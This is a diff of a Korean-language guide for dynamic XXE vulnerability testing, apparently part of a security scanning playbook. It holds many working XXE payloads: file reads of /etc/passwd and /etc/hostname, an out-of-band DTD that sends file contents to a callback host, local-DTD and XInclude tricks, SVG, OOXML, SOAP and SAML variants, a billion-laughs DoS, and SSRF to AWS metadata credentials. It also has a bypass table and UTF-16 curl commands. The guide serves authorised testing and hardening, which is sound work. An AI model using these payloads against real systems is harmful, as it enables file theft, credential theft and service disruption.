@@ -1,99 +1,156 @@
 ### Phase 2: 동적 테스트 (검증)
 
+**기본 페이로드:**
 
-**Classic XXE 테스트:**
-```
-curl -X POST "https://target.com/api/xml" \
-  -H "Content-Type: application/xml" \
-  -H "Cookie: session=..." \
-  -d '<?xml version="1.0" encoding="UTF-8"?>
+**Classic XXE (직접 반영):**
+```xml
+<?xml version="1.0"?>
 <!DOCTYPE foo [
   <!ENTITY xxe SYSTEM "file:///etc/hostname">
 ]>
-<root>&xxe;</root>'
+<root>&xxe;</root>
 ```
 
-**Blind XXE 테스트 (외부 콜백):**
-```
-curl -X POST "https://target.com/api/xml" \
-  -H "Content-Type: application/xml" \
-  -d '<?xml version="1.0" encoding="UTF-8"?>
+**Blind XXE (외부 콜백):**
+```xml
+<?xml version="1.0"?>
 <!DOCTYPE foo [
-  <!ENTITY xxe SYSTEM "https://CALLBACK_URL/xxe-test">
+  <!ENTITY xxe SYSTEM "https://CALLBACK.oast.fun/xxe">
 ]>
-<root>&xxe;</root>'
+<root>&xxe;</root>
 ```
 
-**안전한 테스트 대상 파일:**
-- `file:///etc/hostname` — 무해한 시스템 파일
-- `file:///etc/passwd` — 읽기 전용, 민감 정보 없음
-
-**Parameter Entity 기반 Blind XXE (OOB 데이터 추출):**
-```
-# 외부 DTD를 통한 데이터 추출
-curl -X POST "https://target.com/api/xml" \
-  -H "Content-Type: application/xml" \
-  -d '<?xml version="1.0" encoding="UTF-8"?>
+**Parameter entity OOB 추출:**
+```xml
+<?xml version="1.0"?>
 <!DOCTYPE foo [
-  <!ENTITY % xxe SYSTEM "https://CALLBACK_URL/evil.dtd">
+  <!ENTITY % xxe SYSTEM "https://CALLBACK/evil.dtd">
   %xxe;
 ]>
-<root>test</root>'
-
-# evil.dtd 내용 (콜백 서버에 호스팅):
-# <!ENTITY % file SYSTEM "file:///etc/hostname">
-# <!ENTITY % eval "<!ENTITY &#x25; exfil SYSTEM 'https://CALLBACK_URL/?data=%file;'>">
-# %eval;
-# %exfil;
+<root>test</root>
 ```
 
-**XInclude 테스트 (DOCTYPE 금지 시):**
-```
-curl -X POST "https://target.com/api/xml" \
-  -H "Content-Type: application/xml" \
-  -d '<root xmlns:xi="http://www.w3.org/2001/XInclude">
-  <xi:include parse="text" href="file:///etc/hostname"/>
-</root>'
+evil.dtd (콜백 서버 호스팅):
+```xml
+<!ENTITY % file SYSTEM "file:///etc/hostname">
+<!ENTITY % eval "<!ENTITY &#x25; exfil SYSTEM 'https://CALLBACK/?data=%file;'>">
+%eval;
+%exfil;
 ```
 
-**우회 기법 (기본 XXE 차단 시):**
-```
-# UTF-16 인코딩 (파서 우회)
-# iconv -f UTF-8 -t UTF-16 payload.xml | curl -X POST ... --data-binary @-
-
-# CDATA 래핑으로 특수문자 포함 파일 읽기
-curl -X POST "https://target.com/api/xml" \
-  -H "Content-Type: application/xml" \
-  -d '<?xml version="1.0"?>
+**Local DTD 우회 (네트워크 차단 환경):**
+```xml
 <!DOCTYPE foo [
-  <!ENTITY % start "<![CDATA[">
-  <!ENTITY % file SYSTEM "file:///etc/hostname">
-  <!ENTITY % end "]]>">
-  <!ENTITY % dtd SYSTEM "https://CALLBACK_URL/cdata.dtd">
-  %dtd;
+  <!ENTITY % local_dtd SYSTEM "file:///usr/share/yelp/dtd/docbookx.dtd">
+  <!ENTITY % ISOamso '
+    <!ENTITY &#x25; file SYSTEM "file:///etc/passwd">
+    <!ENTITY &#x25; eval "<!ENTITY &#x26;#x25; error SYSTEM \"file:///nonexistent/&#x25;file;\">">
+    &#x25;eval;
+    &#x25;error;
+  '>
+  %local_dtd;
 ]>
-<root>&all;</root>'
-
-# Content-Type 변형
-curl -X POST "https://target.com/api/endpoint" \
-  -H "Content-Type: text/xml" \
-  -d '<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/hostname">]><root>&xxe;</root>'
-
-# SVG 파일 업로드를 통한 XXE
-# SVG 내부에 XXE 페이로드를 삽입하여 파일 업로드 엔드포인트로 전송
 ```
 
-**응답 분석 기준:**
+**XInclude (DOCTYPE 금지 시):**
+```xml
+<root xmlns:xi="http://www.w3.org/2001/XInclude">
+  <xi:include parse="text" href="file:///etc/hostname"/>
+</root>
+```
 
-| 응답 유형 | 판단 |
-|-----------|------|
-| 응답에 `/etc/hostname` 내용 반영 | 확인됨 (Classic XXE) |
-| 콜백 서비스에서 요청 수신 | 확인됨 (Blind XXE) |
-| 콜백 URL 파라미터에 파일 내용 포함 | 확인됨 (OOB 추출) |
-| `DOCTYPE is disallowed`, `DTD is prohibited` | 안전 (DTD 처리 비활성화) |
-| `External entities are not allowed` | 안전 (외부 엔티티 비활성화) |
-| XML 파싱 에러 (정상적인 구문 오류) | 판단 불가 → 페이로드 수정 |
-| 500 에러 + `SAXParseException` 등 | 후보 (XML 파싱은 발생, 추가 시도 필요) |
+**SVG 업로드 XXE:**
+```xml
+<?xml version="1.0"?>
+<!DOCTYPE svg [<!ENTITY xxe SYSTEM "file:///etc/hostname">]>
+<svg xmlns="http://www.w3.org/2000/svg"><text>&xxe;</text></svg>
+```
 
-**검증 기준:**
-- **확인됨**: 동적 테스트로 외부 엔티티의 내용이 반환되거나 외부 콜백 서비스에서 요청 수신이 확인됨
+**OOXML XXE (XLSX/DOCX 내부):**
+```bash
+unzip sample.xlsx -d tmp/
+# tmp/xl/sharedStrings.xml에 DOCTYPE + ENTITY 삽입
+zip -r evil.xlsx tmp/
+curl -X POST "https://target/api/import" -F "file=@evil.xlsx"
+```
+
+**SOAP XXE (WS-Security):**
+```xml
+<?xml version="1.0"?>
+<!DOCTYPE soap:Envelope [
+  <!ENTITY xxe SYSTEM "file:///etc/hostname">
+]>
+<soap:Envelope xmlns:soap="http://schemas.xmlsoap.org/soap/envelope/">
+  <soap:Body>&xxe;</soap:Body>
+</soap:Envelope>
+```
+
+**SAML XXE (saml-scanner 결합):**
+```xml
+<?xml version="1.0"?>
+<!DOCTYPE samlp:Response [<!ENTITY xxe SYSTEM "file:///etc/passwd">]>
+<samlp:Response>...&xxe;...</samlp:Response>
+```
+
+**Billion laughs (DoS 변형):**
+```xml
+<!DOCTYPE lolz [
+  <!ENTITY lol "lol">
+  <!ENTITY lol2 "&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;">
+  <!ENTITY lol3 "&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;">
+  ...
+]>
+<lolz>&lol9;</lolz>
+```
+
+**SSRF (외부 fetch만):**
+```xml
+<!DOCTYPE foo [
+  <!ENTITY xxe SYSTEM "http://169.254.169.254/latest/meta-data/iam/security-credentials/">
+]>
+<root>&xxe;</root>
+```
+
+---
+
+**우회 페이로드:**
+
+| 방어 | 우회 |
+|---|---|
+| `disallow-doctype-decl=true` 만 적용 | XInclude (`<xi:include>`) — DOCTYPE 불필요 |
+| 일반 엔티티만 차단 | Parameter entity (`<!ENTITY % x SYSTEM ...>`) |
+| 외부 네트워크 차단 | Local DTD trick — 시스템에 존재하는 DTD 활용 OOB |
+| `setValidating(true)` 활성 | 별도 `load-external-dtd=false` 필요 — 검증 자체가 외부 DTD fetch |
+| XML 서명 검증만 | XSW (XML Signature Wrapping) — 서명 노드와 파싱 노드 분리 |
+| `libxml_disable_entity_loader(true)` (PHP 8.0+) | **방어 무효** — deprecated/no-op |
+| UTF-8 검증 | UTF-7/UTF-16 BOM — `iconv -f UTF-8 -t UTF-16` 후 전송 |
+| Content-Type `application/xml` 차단 | `text/xml`, `application/xhtml+xml`, `application/soap+xml` |
+| CDATA escape | Parameter entity 기반 CDATA 래핑 공격 |
+
+```bash
+# UTF-16 BOM 우회
+printf '\xfe\xff' > bom.bin
+cat bom.bin payload.xml | iconv -f UTF-8 -t UTF-16 > utf16.xml
+curl -X POST "https://target/api/xml" -H "Content-Type: application/xml" --data-binary @utf16.xml
+```
+
+---
+
+**참고사항:**
+
+- Classic XXE (직접 반영)는 파서가 응답에 엔티티 결과 포함할 때만 — JSON API는 대부분 blind
+- Parameter entity OOB는 외부 DTD 호스팅 인프라 필요 (콜백 서버 + DTD 파일)
+- Local DTD trick은 외부 네트워크 차단 환경에서 유일한 blind 추출 — OS/설치 환경별 DTD 경로 다름 (Yelp/SUSE/RedHat)
+- XInclude는 DOCTYPE 차단 우회 — `setXIncludeAware(false)` 미적용 환경
+- Java `DocumentBuilderFactory`의 6개 `setFeature` 모두 활성화 필수 (1개 누락도 위험)
+- PHP 8.0+에서 `libxml_disable_entity_loader`는 no-op — 코드 있어도 방어 안 됨
+- OOXML (XLSX/DOCX), SVG, SAML Response가 XML 파서 통과 — file-upload-scanner와 결합
+- Billion laughs (XML bomb)는 XXE는 아니나 같은 파서 설정 — DoS 영향
+- `.NET XmlReaderSettings.DtdProcessing = Prohibit` + `XmlResolver = null` 권장
+- Go `encoding/xml`은 DTD 미지원 — 안전
+- AWS metadata XXE는 SSRF + 데이터 노출 동시 — 가장 큰 영향
+- `expect://` 스킴 (libxml2 일부)으로 명령 실행 가능 (드물지만 존재)
+- `gopher://` 스킴은 일부 PHP libxml2에서 지원
+- Local DTD 후보: `/usr/share/yelp/dtd/docbookx.dtd`, `/usr/share/xml/fontconfig/fonts.dtd`, `/usr/share/xml/scrollkeeper/dtds/scrollkeeper-omf.dtd`
+- 응답에 entity 내용이 직접 포함 안 되어도 OOB 콜백 + 파일 내용 추출 가능
+- Encrypted XML (XML Encryption)도 처리 시점에 XXE 가능 — 암호화 검증과 별도
